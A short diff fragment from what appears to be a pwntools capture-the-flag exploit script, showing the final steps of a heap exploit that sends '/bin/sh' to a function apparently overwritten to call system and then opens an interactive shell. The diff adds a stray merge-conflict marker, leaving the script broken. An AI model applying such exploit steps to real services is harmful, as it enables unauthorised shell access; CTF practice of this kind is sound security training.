@@ -147,4 +147,5 @@ s.sendlineafter("Your choice: ",'1')  # call alloc
 s.sendlineafter('Index:','/bin/sh\x00') # atoll = system , system('bin/sh')
 
 s.interactive()
+>>>>>>> dc6982a9060f3e893ac0ce5478671230dda6c9a7
 s.close()
